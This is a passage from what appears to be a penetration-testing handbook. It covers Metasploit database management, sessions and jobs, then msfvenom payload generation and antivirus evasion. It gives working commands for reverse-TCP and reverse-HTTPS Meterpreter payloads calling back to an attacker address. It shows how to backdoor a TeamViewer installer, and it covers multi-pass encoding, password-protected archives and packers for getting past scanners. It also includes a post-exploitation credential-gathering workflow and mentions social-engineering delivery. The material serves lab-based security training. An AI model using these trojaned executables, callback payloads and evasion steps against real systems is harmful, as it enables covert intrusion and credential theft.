     Active: active (exited) since Fri 2022-05-06 14:51:30 BST; 3min 51s ago
</code></pre>
<h4 id="start-postgresql"><a class="header" href="#start-postgresql">Start PostgreSQL</a></h4>
<pre><code class="language-bash">sudo systemctl start postgresql
</code></pre>
<h4 id="initialize-msf-database"><a class="header" href="#initialize-msf-database">Initialize MSF Database</a></h4>
<pre><code class="language-bash">sudo msfdb init

[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
</code></pre>
<p>If you encounter errors, try updating Metasploit (<code>apt update</code>) and reinitializing.</p>
<h4 id="check-database-status"><a class="header" href="#check-database-status">Check Database Status</a></h4>
<pre><code class="language-bash">sudo msfdb status
</code></pre>
<h3 id="connecting-to-the-database"><a class="header" href="#connecting-to-the-database">Connecting to the Database</a></h3>
<pre><code class="language-bash">msf6 &gt; db_status

[*] Connected to msf. Connection type: postgresql.
</code></pre>
<p>If you receive an error about the database not being connected:</p>
<pre><code class="language-bash">msf6 &gt; db_connect msf@msf

Connected to Postgres data service: 127.0.0.1/msf
</code></pre>
<h3 id="workspaces-1"><a class="header" href="#workspaces-1">Workspaces</a></h3>
<p>Workspaces help organize different assessment projects. Similar to folders, workspaces isolate different projects‚Äô host data, loot, and activities.</p>
<pre><code class="language-bash">msf6 &gt; workspace

* default
</code></pre>
<h4 id="workspace-commands"><a class="header" href="#workspace-commands">Workspace Commands</a></h4>
<pre><code class="language-bash">msf6 &gt; workspace -h

Usage:
    workspace                  List workspaces
    workspace -v               List workspaces verbosely
    workspace [name]           Switch workspace
    workspace -a [name] ...    Add workspace(s)
    workspace -d [name] ...    Delete workspace(s)
    workspace -D               Delete all workspaces
    workspace -r &lt;old&gt; &lt;new&gt;   Rename workspace
</code></pre>
<h4 id="create-and-select-workspace"><a class="header" href="#create-and-select-workspace">Create and Select Workspace</a></h4>
<pre><code class="language-bash">msf6 &gt; workspace -a Target_1

[*] Added workspace: Target_1
[*] Workspace: Target_1

msf6 &gt; workspace Target_1 

[*] Workspace: Target_1

msf6 &gt; workspace

  default
* Target_1
</code></pre>
<h3 id="importing-scan-results"><a class="header" href="#importing-scan-results">Importing Scan Results</a></h3>
<p>Import Nmap XML scans into the database (XML format is preferred for <code>db_import</code>):</p>
<pre><code class="language-bash">msf6 &gt; db_import Target.xml

[*] Importing 'Nmap XML' data
[*] Import: Parsing with 'Nokogiri v1.10.9'
[*] Importing host 10.10.10.40
[*] Successfully imported ~/Target.xml
</code></pre>
<h3 id="using-nmap-inside-msfconsole"><a class="header" href="#using-nmap-inside-msfconsole">Using Nmap Inside MSFconsole</a></h3>
<p>Scan directly from msfconsole using <code>db_nmap</code>:</p>
<pre><code class="language-bash">msf6 &gt; db_nmap -sV -sS 10.10.10.8

[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 21:04 UTC
[*] Nmap: Nmap scan report for 10.10.10.8
[*] Nmap: Host is up (0.016s latency).
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 80/TCP open  http    HttpFileServer httpd 2.3
</code></pre>
<h3 id="viewing-data"><a class="header" href="#viewing-data">Viewing Data</a></h3>
<h4 id="hosts"><a class="header" href="#hosts">Hosts</a></h4>
<pre><code class="language-bash">msf6 &gt; hosts

Hosts
=====

address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
10.10.10.40             Unknown                    device         
</code></pre>
<h4 id="hosts-command-options-1"><a class="header" href="#hosts-command-options-1">Hosts Command Options</a></h4>
<pre><code class="language-bash">msf6 &gt; hosts -h

Usage: hosts [ options ] [addr1 addr2 ...]

  -a,--add          Add the hosts instead of searching
  -d,--delete       Delete the hosts instead of searching
  -c &lt;col1,col2&gt;    Only show the given columns
  -C &lt;col1,col2&gt;    Only show the given columns until the next restart
  -h,--help         Show this help information
  -u,--up           Only show hosts which are up
  -o &lt;file&gt;         Send output to a file in csv format
  -O &lt;column&gt;       Order rows by specified column number
  -R,--rhosts       Set RHOSTS from the results of the search
  -S,--search       Search string to filter by
  -i,--info         Change the info of a host
  -n,--name         Change the name of a host
  -m,--comment      Change the comment of a host
  -t,--tag          Add or specify a tag to a range of hosts
</code></pre>
<h4 id="services-1"><a class="header" href="#services-1">Services</a></h4>
<pre><code class="language-bash">msf6 &gt; services

Services
========

host         port   proto  name          state  info
----         ----   -----  ----          -----  ----
10.10.10.40  135    tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
10.10.10.40  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
</code></pre>
<h4 id="services-command-options-1"><a class="header" href="#services-command-options-1">Services Command Options</a></h4>
<pre><code class="language-bash">msf6 &gt; services -h

Usage: services [-h] [-u] [-a] [-r &lt;proto&gt;] [-p &lt;port1,port2&gt;] [-s &lt;name1,name2&gt;] [-o &lt;filename&gt;] [addr1 addr2 ...]

  -a,--add          Add the services instead of searching
  -d,--delete       Delete the services instead of searching
  -c &lt;col1,col2&gt;    Only show the given columns
  -p &lt;port&gt;         Search for a list of ports
  -r &lt;protocol&gt;     Protocol type of the service being added [tcp|udp]
  -s &lt;name&gt;         List creds matching comma-separated service names
  -u,--up           Only show services which are up
  -o &lt;file&gt;         Send output to a file in csv format
  -R,--rhosts       Set RHOSTS from the results of the search
  -S,--search       Search string to filter by
  -U,--update       Update data for existing service
</code></pre>
<h3 id="credentials"><a class="header" href="#credentials">Credentials</a></h3>
<p>The <code>creds</code> command allows you to visualize credentials gathered during interactions with target hosts. You can also add credentials manually, match with port specifications, and add descriptions.</p>
<pre><code class="language-bash">msf6 &gt; creds -h

With no sub-command, list credentials. If an address range is
given, show only credentials with logins on hosts within that range.

Usage - Listing credentials:
  creds [filter options] [address range]

Usage - Adding credentials:
  creds add uses the following named parameters.
    user      :  Public, usually a username
    password  :  Private, private_type Password.
    ntlm      :  Private, private_type NTLM Hash.
    ssh-key   :  Private, private_type SSH key, must be a file path.
    hash      :  Private, private_type Nonreplayable hash
    realm     :  Realm
    realm-type:  Realm type (domain db2db sid pgdb rsync wildcard)

Examples: Adding
   creds add user:admin password:notpassword realm:workgroup
   creds add user:guest password:'guest password'
   creds add user:admin ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A
   creds add user:sshadmin ssh-key:/path/to/id_rsa
   creds add user:other hash:d19c32489b870735b5f587d76b934283 jtr:md5

Filter options for listing:
  -P,--password &lt;text&gt;  List passwords that match this text
  -p,--port &lt;portspec&gt;  List creds with logins on services matching this port spec
  -s &lt;svc names&gt;        List creds matching comma-separated service names
  -u,--user &lt;text&gt;      List users that match this text
  -t,--type &lt;type&gt;      List creds that match the following types: password,ntlm,hash
  -R,--rhosts           Set RHOSTS from the results of the search

Examples, listing:
  creds               # Default, returns all credentials
  creds 1.2.3.4/24    # Return credentials with logins in this range
  creds -p 22-25,445  # nmap port specification
  creds -s ssh,smb    # All creds associated with SSH or SMB services
  creds -t NTLM       # All NTLM creds
</code></pre>
<h3 id="loot"><a class="header" href="#loot">Loot</a></h3>
<p>The <code>loot</code> command works with credentials to offer an at-a-glance list of owned services and users. Loot refers to hash dumps from different system types (hashes, passwd, shadow, etc.).</p>
<pre><code class="language-bash">msf6 &gt; loot -h

Usage: loot [options]
 Info: loot [-h] [addr1 addr2 ...] [-t &lt;type1,type2&gt;]
  Add: loot -f [fname] -i [info] -a [addr1 addr2 ...] -t [type]
  Del: loot -d [addr1 addr2 ...]

  -a,--add          Add loot to the list of addresses, instead of listing
  -d,--delete       Delete *all* loot matching host and type
  -f,--file         File with contents of the loot to add
  -i,--info         Info of the loot to add
  -t &lt;type1,type2&gt;  Search for a list of types
  -S,--search       Search string to filter by
</code></pre>
<hr>
<h2 id="sessions-1"><a class="header" href="#sessions-1">Sessions</a></h2>
<p>MSFconsole can manage multiple modules at the same time. This is one of the many reasons it provides the user with so much flexibility. This is done with the use of Sessions, which creates dedicated control interfaces for all of your deployed modules.</p>
<p>Once several sessions are created, we can switch between them and link a different module to one of the backgrounded sessions to run on it or turn them into jobs.</p>
<p><strong>Important:</strong> Once a session is placed in the background, it will continue to run, and our connection to the target host will persist. Sessions can, however, die if something goes wrong during the payload runtime, causing the communication channel to tear down.</p>
<h3 id="backgrounding-sessions"><a class="header" href="#backgrounding-sessions">Backgrounding Sessions</a></h3>
<p>While running any available exploits or auxiliary modules in msfconsole, we can background the session as long as they form a channel of communication with the target host. This can be done either by:</p>
<ol>
<li>Pressing the <code>[CTRL] + [Z]</code> key combination</li>
<li>Typing the <code>background</code> command in Meterpreter stages</li>
</ol>
<p>This will prompt with a confirmation message. After accepting, you‚Äôll be taken back to the msfconsole prompt (<code>msf6 &gt;</code>) and can immediately launch a different module.</p>
<h3 id="listing-active-sessions"><a class="header" href="#listing-active-sessions">Listing Active Sessions</a></h3>
<p>Use the <code>sessions</code> command to view currently active sessions:</p>
<pre><code class="language-bash">msf6 exploit(windows/smb/psexec_psh) &gt; sessions

Active sessions
===============

  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -&gt; 10.10.10.205:50501 (10.10.10.205)
</code></pre>
<h3 id="interacting-with-a-session"><a class="header" href="#interacting-with-a-session">Interacting with a Session</a></h3>
<p>Use the <code>sessions -i [no.]</code> command to open up a specific session:</p>
<pre><code class="language-bash">msf6 exploit(windows/smb/psexec_psh) &gt; sessions -i 1
[*] Starting interaction with 1...

meterpreter &gt; 
</code></pre>
<h3 id="using-sessions-with-post-exploitation-modules"><a class="header" href="#using-sessions-with-post-exploitation-modules">Using Sessions with Post-Exploitation Modules</a></h3>
<p>This is specifically useful when you want to run an additional module on an already exploited system with a formed, stable communication channel.</p>
<p><strong>Workflow:</strong></p>
<ol>
<li>Background your current session (formed from first exploit success)</li>
<li>Search for the second module you wish to run</li>
<li>Select the session number on which the module should run (from <code>show options</code>)</li>
</ol>
<p>Usually, these modules can be found in the <code>post</code> category (Post-Exploitation modules). Main archetypes include:</p>
<ul>
<li>Credential gatherers</li>
<li>Local exploit suggesters</li>
<li>Internal network scanners</li>
</ul>
<pre><code class="language-bash"># Background current session
meterpreter &gt; background
[*] Backgrounding session 1...

# Search for post module
msf6 &gt; search type:post platform:windows gather

# Select module
msf6 &gt; use post/windows/gather/credentials/credential_collector

# View options - note the SESSION option
msf6 post(windows/gather/credentials/credential_collector) &gt; show options

Module options (post/windows/gather/credentials/credential_collector):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

# Set the session
msf6 post(windows/gather/credentials/credential_collector) &gt; set SESSION 1
SESSION =&gt; 1

# Run the module
msf6 post(windows/gather/credentials/credential_collector) &gt; run
</code></pre>
<hr>
<h2 id="jobs-1"><a class="header" href="#jobs-1">Jobs</a></h2>
<p>If, for example, we are running an active exploit under a specific port and need this port for a different module, we cannot simply terminate the session using <code>[CTRL] + [C]</code>. If we did that, we would see that the port would still be in use, affecting our use of the new module.</p>
<p>Instead, we need to use the <code>jobs</code> command to look at the currently active tasks running in the background and terminate the old ones to free up the port.</p>
<p>Other types of tasks inside sessions can also be converted into jobs to run in the background seamlessly, even if the session dies or disappears.</p>
<h3 id="jobs-command-help-menu"><a class="header" href="#jobs-command-help-menu">Jobs Command Help Menu</a></h3>
<pre><code class="language-bash">msf6 exploit(multi/handler) &gt; jobs -h
Usage: jobs [options]

Active job manipulation and interaction.

OPTIONS:

    -K        Terminate all running jobs.
    -P        Persist all running jobs on restart.
    -S &lt;opt&gt;  Row search filter.
    -h        Help banner.
    -i &lt;opt&gt;  Lists detailed information about a running job.
    -k &lt;opt&gt;  Terminate jobs by job ID and/or range.
    -l        List all running jobs.
    -p &lt;opt&gt;  Add persistence to job by job ID
    -v        Print more detailed info.  Use with -i and -l
</code></pre>
<h3 id="exploit-command-help-menu"><a class="header" href="#exploit-command-help-menu">Exploit Command Help Menu</a></h3>
<p>When we run an exploit, we can run it as a job by typing <code>exploit -j</code>. Per the help menu, adding <code>-j</code> to our command will ‚Äúrun it in the context of a job.‚Äù</p>
<pre><code class="language-bash">msf6 exploit(multi/handler) &gt; exploit -h
Usage: exploit [options]

Launches an exploitation attempt.

OPTIONS:

    -J        Force running in the foreground, even if passive.
    -e &lt;opt&gt;  The payload encoder to use.  If none is specified, ENCODER is used.
    -f        Force the exploit to run regardless of the value of MinimumRank.
    -h        Help banner.
    -j        Run in the context of a job.
    -z        Do not interact with the session after successful exploitation.
</code></pre>
<h3 id="running-an-exploit-as-a-background-job"><a class="header" href="#running-an-exploit-as-a-background-job">Running an Exploit as a Background Job</a></h3>
<pre><code class="language-bash">msf6 exploit(multi/handler) &gt; exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.34:4444
</code></pre>
<h3 id="listing-running-jobs"><a class="header" href="#listing-running-jobs">Listing Running Jobs</a></h3>
<p>To list all running jobs, use the <code>jobs -l</code> command:</p>
<pre><code class="language-bash">msf6 &gt; jobs -l

Jobs
====

  Id  Name                    Payload                          Payload opts
  --  ----                    -------                          ------------
  0   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://10.10.14.34:4444
</code></pre>
<h3 id="managing-jobs"><a class="header" href="#managing-jobs">Managing Jobs</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Command</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>jobs -l</code></td><td>List all running jobs</td></tr>
<tr><td><code>jobs -i &lt;id&gt;</code></td><td>Show detailed information about a job</td></tr>
<tr><td><code>jobs -k &lt;id&gt;</code></td><td>Kill a specific job by ID</td></tr>
<tr><td><code>jobs -K</code></td><td>Kill all running jobs</td></tr>
<tr><td><code>kill &lt;index no.&gt;</code></td><td>Kill job by index number</td></tr>
</tbody>
</table>
</div>
<h3 id="example-multiple-handlers-workflow"><a class="header" href="#example-multiple-handlers-workflow">Example: Multiple Handlers Workflow</a></h3>
<pre><code class="language-bash"># Configure first handler
msf6 &gt; use exploit/multi/handler
msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) &gt; set LHOST 10.10.14.34
msf6 exploit(multi/handler) &gt; set LPORT 4444

# Run as background job
msf6 exploit(multi/handler) &gt; exploit -j
[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 10.10.14.34:4444

# Configure second handler on different port
msf6 exploit(multi/handler) &gt; set LPORT 4445
msf6 exploit(multi/handler) &gt; exploit -j
[*] Exploit running as background job 1.
[*] Started reverse TCP handler on 10.10.14.34:4445

# List all jobs
msf6 &gt; jobs -l

Jobs
====

  Id  Name                    Payload                          Payload opts
  --  ----                    -------                          ------------
  0   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://10.10.14.34:4444
  1   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://10.10.14.34:4445

# Kill specific job to free port
msf6 &gt; jobs -k 0
[*] Stopping the following job(s): 0

# Kill all jobs
msf6 &gt; jobs -K
[*] Stopping all jobs...
</code></pre>
<p><strong>Important:</strong> Using <code>[CTRL] + [C]</code> to stop an exploit will not properly release the port. Always use <code>jobs -k &lt;id&gt;</code> to terminate jobs and free up ports correctly.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="msfvenom"><a class="header" href="#msfvenom">msfvenom</a></h1>
<p>Understanding how targets are defended helps attack them more efficiently and quietly. Defense mechanisms fall into two main categories: <strong>Endpoint Protection</strong> and <strong>Perimeter Protection</strong>.</p>
<hr>
<h2 id="endpoint-protection"><a class="header" href="#endpoint-protection">Endpoint Protection</a></h2>
<p>Endpoint protection refers to localized device or service protection for a single host on the network. The host can be a personal computer, corporate workstation, or server in a DMZ.</p>
<h3 id="common-components"><a class="header" href="#common-components">Common Components</a></h3>
<p>Endpoint protection usually comes as software packages that include:</p>
<ul>
<li><strong>Antivirus Protection</strong> - Signature-based malware detection</li>
<li><strong>Antimalware Protection</strong> - Bloatware, spyware, adware, scareware, ransomware</li>
<li><strong>Host Firewall</strong> - Local traffic filtering</li>
<li><strong>Anti-DDoS</strong> - Denial of service protection</li>
</ul>
<h3 id="popular-endpoint-protection-products"><a class="header" href="#popular-endpoint-protection-products">Popular Endpoint Protection Products</a></h3>
<ul>
<li>Avast</li>
<li>Nod32</li>
<li>Malwarebytes</li>
<li>BitDefender</li>
<li>Windows Defender</li>
<li>ClamAV</li>
</ul>
<hr>
<h2 id="perimeter-protection"><a class="header" href="#perimeter-protection">Perimeter Protection</a></h2>
<p>Perimeter protection comes in physical or virtualized devices on the network perimeter edge. These edge devices provide access inside the network from the outside (public to private).</p>
<h3 id="network-zones"><a class="header" href="#network-zones">Network Zones</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Zone</th><th>Description</th><th>Trust Level</th></tr>
</thead>
<tbody>
<tr><td><strong>Outside</strong></td><td>The Internet, public networks</td><td>Lowest</td></tr>
<tr><td><strong>DMZ</strong></td><td>Public-facing servers (web, email, DNS)</td><td>Medium</td></tr>
<tr><td><strong>Inside</strong></td><td>Internal corporate network</td><td>Highest</td></tr>
</tbody>
</table>
</div>
<p>The DMZ houses servers that push and pull data for public clients from the Internet but are managed from the inside network.</p>
<hr>
<h2 id="security-policies"><a class="header" href="#security-policies">Security Policies</a></h2>
<p>Security policies function like ACLs (Access Control Lists) - essentially allow and deny statements that dictate how traffic or files can exist within a network boundary.</p>
<h3 id="policy-types"><a class="header" href="#policy-types">Policy Types</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Policy Type</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><strong>Network Traffic Policies</strong></td><td>Control packet flow based on ports, protocols, IPs</td></tr>
<tr><td><strong>Application Policies</strong></td><td>Control which applications can run</td></tr>
<tr><td><strong>User Access Control Policies</strong></td><td>Define user permissions and authentication</td></tr>
<tr><td><strong>File Management Policies</strong></td><td>Control file access, modification, transfer</td></tr>
<tr><td><strong>DDoS Protection Policies</strong></td><td>Rate limiting, traffic shaping</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="detection-methods-1"><a class="header" href="#detection-methods-1">Detection Methods</a></h2>
<h3 id="signature-based-detection"><a class="header" href="#signature-based-detection">Signature-based Detection</a></h3>
<p>Compares network packets against pre-built attack pattern signatures. Any 100% match generates alarms.</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Very accurate for known threats</li>
<li>Low false positive rate</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Cannot detect new/unknown attacks</li>
<li>Requires constant signature updates</li>
</ul>
<h3 id="heuristicstatistical-anomaly-detection"><a class="header" href="#heuristicstatistical-anomaly-detection">Heuristic/Statistical Anomaly Detection</a></h3>
<p>Behavioral comparison against an established baseline, including APT (Advanced Persistent Threat) signatures.</p>
<p><strong>Detection Approach:</strong></p>
<ol>
<li>Establish baseline of normal network behavior</li>
<li>Identify commonly used protocols</li>
<li>Generate alarms when deviations exceed threshold</li>
</ol>
<h3 id="stateful-protocol-analysis-detection"><a class="header" href="#stateful-protocol-analysis-detection">Stateful Protocol Analysis Detection</a></h3>
<p>Recognizes divergence of protocols by event comparison using pre-built profiles of generally accepted non-malicious activity definitions.</p>
<h3 id="live-monitoring-and-alerting-soc-based"><a class="header" href="#live-monitoring-and-alerting-soc-based">Live-monitoring and Alerting (SOC-based)</a></h3>
<p>Security Operations Center (SOC) analysts use live-feed software to monitor network activity and intermediate alarming systems for potential threats.</p>
<hr>
<h2 id="evasion-techniques"><a class="header" href="#evasion-techniques">Evasion Techniques</a></h2>
<h3 id="payload-encoding"><a class="header" href="#payload-encoding">Payload Encoding</a></h3>
<p>Most host-based antivirus software relies on signature-based detection. Encoding payloads can help evade these signatures.</p>
<h4 id="generate-encoded-payload-1"><a class="header" href="#generate-encoded-payload-1">Generate Encoded Payload</a></h4>
<pre><code class="language-bash">msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 \
  -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
</code></pre>
<p><strong>Output:</strong></p>
<pre><code>Found 1 compatible encoders
Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 27 (iteration=0)
x86/shikata_ga_nai succeeded with size 54 (iteration=1)
x86/shikata_ga_nai succeeded with size 81 (iteration=2)
x86/shikata_ga_nai succeeded with size 108 (iteration=3)
x86/shikata_ga_nai succeeded with size 135 (iteration=4)
x86/shikata_ga_nai chosen with final size 135
Payload size: 135 bytes
Saved as: /home/user/test.js
</code></pre>
<p><strong>Note:</strong> Simply encoding payloads with multiple iterations is often not sufficient for all AV products.</p>
<h3 id="encrypted-communication-channels"><a class="header" href="#encrypted-communication-channels">Encrypted Communication Channels</a></h3>
<p>MSF6 can tunnel AES-encrypted communication from Meterpreter shells back to the attacker, successfully encrypting traffic as the payload is sent.</p>
<p><strong>Benefits:</strong></p>
<ul>
<li>Evades network-based IDS/IPS</li>
<li>Meterpreter runs in memory (no file on disk)</li>
</ul>
<h3 id="executable-templates-backdoored-executables"><a class="header" href="#executable-templates-backdoored-executables">Executable Templates (Backdoored Executables)</a></h3>
<p>msfvenom can embed payloads into legitimate executable files, hiding shellcode deep within legitimate code.</p>
<h4 id="create-backdoored-executable"><a class="header" href="#create-backdoored-executable">Create Backdoored Executable</a></h4>
<pre><code class="language-bash">msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 \
  -k -x ~/Downloads/TeamViewer_Setup.exe \
  -e x86/shikata_ga_nai -a x86 --platform windows \
  -o ~/Desktop/TeamViewer_Setup.exe -i 5
</code></pre>
<p><strong>Output:</strong></p>
<pre><code>Found 1 compatible encoders
Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 27 (iteration=0)
x86/shikata_ga_nai succeeded with size 54 (iteration=1)
x86/shikata_ga_nai succeeded with size 81 (iteration=2)
x86/shikata_ga_nai succeeded with size 108 (iteration=3)
x86/shikata_ga_nai succeeded with size 135 (iteration=4)
x86/shikata_ga_nai chosen with final size 135
Payload size: 135 bytes
Saved as: /home/user/Desktop/TeamViewer_Setup.exe
</code></pre>
<h4 id="key-flags-1"><a class="header" href="#key-flags-1">Key Flags</a></h4>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Flag</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>-k</code></td><td>Keep template‚Äôs normal execution flow (payload runs in separate thread)</td></tr>
<tr><td><code>-x &lt;file&gt;</code></td><td>Specify executable template</td></tr>
<tr><td><code>-e &lt;encoder&gt;</code></td><td>Encoder to use</td></tr>
<tr><td><code>-i &lt;iterations&gt;</code></td><td>Number of encoding passes</td></tr>
<tr><td><code>-a &lt;arch&gt;</code></td><td>Target architecture</td></tr>
<tr><td><code>--platform</code></td><td>Target platform</td></tr>
</tbody>
</table>
</div>
<p><strong>Note:</strong> With <code>-k</code> flag, the original application runs normally while the payload executes in a separate thread. However, if launched from CLI, a separate window may pop up for the payload.</p>
<hr>
<h2 id="archives-for-evasion"><a class="header" href="#archives-for-evasion">Archives for Evasion</a></h2>
<p>Password-protected archives bypass many common AV signatures because the scanner cannot inspect the contents.</p>
<h3 id="creating-protected-archives"><a class="header" href="#creating-protected-archives">Creating Protected Archives</a></h3>
<pre><code class="language-bash"># ZIP with password
zip -e -P password payload.zip payload.exe

# 7-Zip with password
7z a -pPassword123 payload.7z payload.exe
</code></pre>
<p><strong>Considerations:</strong></p>
<ul>
<li>Files will be flagged as ‚Äúunable to scan‚Äù in AV dashboards</li>
<li>Administrators may manually inspect locked archives</li>
<li>Effective for initial delivery when combined with social engineering</li>
</ul>
<hr>
<h2 id="packers"><a class="header" href="#packers">Packers</a></h2>
<p>Packers compress and obfuscate executables by packing the payload with decompression code into a single file. When run, the decompression code restores the original executable transparently.</p>
<h3 id="popular-packers-1"><a class="header" href="#popular-packers-1">Popular Packers</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Packer</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><strong>UPX</strong></td><td>Universal packer, widely used</td></tr>
<tr><td><strong>The Enigma Protector</strong></td><td>Windows executable protection</td></tr>
<tr><td><strong>MPRESS</strong></td><td>Compact packer for PE/ELF/Mach-O</td></tr>
<tr><td><strong>Alternate EXE Packer</strong></td><td>Simple Windows packer</td></tr>
<tr><td><strong>ExeStealth</strong></td><td>Anti-debugging features</td></tr>
<tr><td><strong>MEW</strong></td><td>Minimal size packer</td></tr>
<tr><td><strong>Themida</strong></td><td>Advanced code virtualization</td></tr>
<tr><td><strong>Morphine</strong></td><td>Polymorphic packer</td></tr>
</tbody>
</table>
</div>
<h3 id="upx-usage"><a class="header" href="#upx-usage">UPX Usage</a></h3>
<pre><code class="language-bash"># Compress executable
upx -9 payload.exe -o packed.exe

# Maximum compression with --ultra-brute
upx --ultra-brute payload.exe -o packed.exe

# Decompress (for analysis)
upx -d packed.exe
</code></pre>
<p><strong>Reference:</strong> Check out the <a href="https://github.com/polypack">PolyPack project</a> for more packer information.</p>
<hr>
<h2 id="virustotal-analysis-2"><a class="header" href="#virustotal-analysis-2">VirusTotal Analysis</a></h2>
<p>Use Metasploit‚Äôs built-in VirusTotal integration to test detection rates:</p>
<pre><code class="language-bash">msf-virustotal -k &lt;API_key&gt; -f test.js
</code></pre>
<p><strong>Sample Output:</strong></p>
<pre><code>[*] Using API key: &lt;API key&gt;
[*] Please wait while I upload test.js...
[*] VirusTotal: Scan request successfully queued
[*] Sample MD5 hash    : 35e7687f0793dc3e048d557feeaf615a
[*] Sample SHA1 hash   : f2f1c4051d8e71df0741b40e4d91622c4fd27309
[*] Analysis link: https://www.virustotal.com/gui/file/&lt;SNIP&gt;/detection
[*] Analysis Report: test.js (11 / 59)
</code></pre>
<h3 id="detection-rates-example"><a class="header" href="#detection-rates-example">Detection Rates Example</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Antivirus</th><th>Detected</th><th>Result</th></tr>
</thead>
<tbody>
<tr><td>AVG</td><td>true</td><td>Win32:ShikataGaNai-A [Trj]</td></tr>
<tr><td>Avast</td><td>true</td><td>Win32:ShikataGaNai-A [Trj]</td></tr>
<tr><td>BitDefender</td><td>true</td><td>Exploit.Metacoder.Shikata.Gen</td></tr>
<tr><td>ClamAV</td><td>true</td><td>Win.Trojan.MSShellcode-6360729-0</td></tr>
<tr><td>ESET-NOD32</td><td>false</td><td>-</td></tr>
<tr><td>Kaspersky</td><td>false</td><td>-</td></tr>
<tr><td>Malwarebytes</td><td>false</td><td>-</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="exploit-code-considerations"><a class="header" href="#exploit-code-considerations">Exploit Code Considerations</a></h2>
<h3 id="offset-randomization"><a class="header" href="#offset-randomization">Offset Randomization</a></h3>
<p>When coding exploits, add randomization to break IPS/IDS database signatures for well-known exploit buffers:</p>
<pre><code class="language-ruby">'Targets' =&gt;
[
 [ 'Windows 2000 SP4 English', { 'Ret' =&gt; 0x77e14c29, 'Offset' =&gt; 5093 } ],
],
</code></pre>
<h3 id="avoid-obvious-nop-sleds"><a class="header" href="#avoid-obvious-nop-sleds">Avoid Obvious NOP Sleds</a></h3>
<p>IPS/IDS regularly check for standard NOP sleds. Test custom exploit code against a sandbox before deployment.</p>
<h3 id="buffer-overflow-considerations"><a class="header" href="#buffer-overflow-considerations">Buffer Overflow Considerations</a></h3>
<ul>
<li>Typical BoF exploits are easily distinguished by hexadecimal buffer patterns</li>
<li>Use randomized shellcode encoding</li>
<li>Vary NOP equivalents (NOPs can be replaced with other single-byte instructions)</li>
</ul>
<hr>
<h2 id="msf6-encrypted-sessions"><a class="header" href="#msf6-encrypted-sessions">MSF6 Encrypted Sessions</a></h2>
<h3 id="https-meterpreter-with-stage-encoding"><a class="header" href="#https-meterpreter-with-stage-encoding">HTTPS Meterpreter with Stage Encoding</a></h3>
<pre><code class="language-bash">use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set EnableStageEncoding true
set StageEncoder x64/xor
run -j
</code></pre>
<h3 id="benefits-5"><a class="header" href="#benefits-5">Benefits</a></h3>
<ul>
<li>AES-encrypted tunnel between Meterpreter and attacker</li>
<li>Payload runs in memory (harder to detect)</li>
<li>Encrypted traffic blends with normal HTTPS traffic</li>
</ul>
<hr>
<h2 id="dns-exfiltration"><a class="header" href="#dns-exfiltration">DNS Exfiltration</a></h2>
<p>In cases with strict traffic rules, DNS can be used for data exfiltration. This technique was notably used in the Equifax breach of 2017.</p>
<h3 id="characteristics"><a class="header" href="#characteristics">Characteristics</a></h3>
<ul>
<li>Slow but stealthy</li>
<li>Often allowed through firewalls</li>
<li>Difficult to detect without DNS-specific monitoring</li>
<li>Can bypass IP-based filtering</li>
</ul>
<h3 id="references-1"><a class="header" href="#references-1">References</a></h3>
<ul>
<li><a href="https://www.ftc.gov/equifax-data-breach">US Government Post-Mortem Report on Equifax Hack</a></li>
<li><a href="https://www.infoblox.com/">Protecting from DNS Exfiltration</a></li>
<li><a href="https://www.infoblox.com/">Stopping Data Exfil and Malware Spread through DNS</a></li>
</ul>
<hr>
<h2 id="evasion-workflow"><a class="header" href="#evasion-workflow">Evasion Workflow</a></h2>
<h3 id="step-1-choose-delivery-method"><a class="header" href="#step-1-choose-delivery-method">Step 1: Choose Delivery Method</a></h3>
<ul>
<li>Backdoored executable</li>
<li>Macro-enabled document</li>
